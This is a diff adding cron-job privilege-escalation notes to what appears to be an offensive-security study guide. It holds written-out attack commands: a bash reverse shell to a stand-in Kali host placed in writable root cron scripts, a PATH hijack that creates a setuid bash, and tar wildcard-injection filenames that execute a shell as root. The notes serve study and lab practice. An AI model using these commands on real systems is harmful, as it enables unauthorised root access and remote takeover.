@@ -231,3 +231,112 @@ For more information and a practical guide, [click here](/Offensive_Security/Lin
 
 ---
 
+## Cron Job Privilege Escalation
+
+### What are Cron Jobs?
+
+Cron is a Linux task scheduler. System-level cron jobs typically run as root. If a root-owned cron job executes a script that a low-privilege user can modify, arbitrary commands can be executed as root.
+
+### Crontab Syntax
+
+```
+# m  h  dom  mon  dow  command
+  *  *   *    *    *   /path/to/script.sh
+```
+
+| Field        | Values           |
+| ------------ | ---------------- |
+| minute       | 0–59             |
+| hour         | 0–23             |
+| day of month | 1–31             |
+| month        | 1–12             |
+| day of week  | 0–6 (0 = Sunday) |
+
+`* * * * *` = every minute.
+
+### Enumeration
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.daily/
+ps aux | grep cron
+```
+
+### Attack Scenario 1 — Writable Script
+
+Crontab contains:
+
+```
+* * * * *  root  /home/karen/backup.sh
+```
+
+Check permissions:
+
+```bash
+ls -la /home/karen/backup.sh
+# if karen owns it or it's world-writable:
+echo '#!/bin/bash' > /home/karen/backup.sh
+echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> /home/karen/backup.sh
+chmod +x /home/karen/backup.sh
+```
+
+On Kali:
+
+```bash
+nc -lvnp 4444
+```
+
+### Attack Scenario 2 — PATH Hijacking
+
+Crontab contains:
+
+```
+PATH=/home/karen:/usr/local/sbin:/usr/local/bin
+
+* * * * *  root  backup.sh
+```
+
+Script is called without full path and a writable directory is first in PATH:
+
+```bash
+echo '#!/bin/bash' > /home/karen/backup.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/karen/backup.sh
+chmod +x /home/karen/backup.sh
+# wait for cron, then:
+/tmp/rootbash -p
+```
+
+### Attack Scenario 3 — Wildcard Injection
+
+Script contains:
+
+```bash
+cd /home/user/backup && tar cf backup.tar *
+```
+
+The `*` expands to filenames before tar runs. Filenames starting with `--` are interpreted as flags:
+
+```bash
+cd /home/user/backup
+echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > shell.sh
+chmod +x shell.sh
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=bash shell.sh"
+```
+
+When cron runs tar, the filenames are passed as arguments → shell executes as root.
+
+Other tools vulnerable to wildcard injection: `rsync`, `7z`, `find`.
+
+### Key Notes
+
+- Always `chmod +x` the script — cron requires execute permission
+- If the script references a non-existent path, it will fail silently — overwrite the script itself instead
+- Check `/var/log/syslog` for cron execution logs (requires elevated privileges)
+
+For more information and a practical guide, [click here](/Offensive_Security/Linux_Privilege_Escalation/linux_privesc_writeup_cronjobs.md).
+
+---
+
